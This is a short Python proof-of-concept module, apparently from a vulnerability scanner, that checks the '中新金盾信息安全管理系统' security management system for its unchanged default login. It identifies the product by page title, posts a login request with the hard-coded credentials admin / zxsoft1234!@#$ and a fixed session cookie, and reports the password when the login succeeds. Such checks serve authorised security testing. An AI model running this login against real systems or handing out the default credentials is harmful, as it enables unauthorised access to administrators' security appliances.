# -*- coding:utf-8 -*-
# 中新金盾信息安全管理系统 默认密码

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def login(self, url):
        resp = self.requestUtil.post(url+"/?q=common/login", cookies="PHPSESSID=8cffa2fed0d07932cc3e6905f4760a66; check_code=1", data="name=admin&password=zxsoft1234!%40%23%24&checkcode=1&doLoginSubmit=1")
        if resp.text == "1":
            return True

    def fingerprint(self):
        try:
            if self.service.title == "中新金盾信息安全管理系统":
                return True
        except:
            return False

    def poc(self):
        try:
            if self.login(self.service.url):
                return ["中新金盾信息安全管理系统 默认密码", "用户名: admin<br>密码: zxsoft1234!@#$"]
        except:
            return []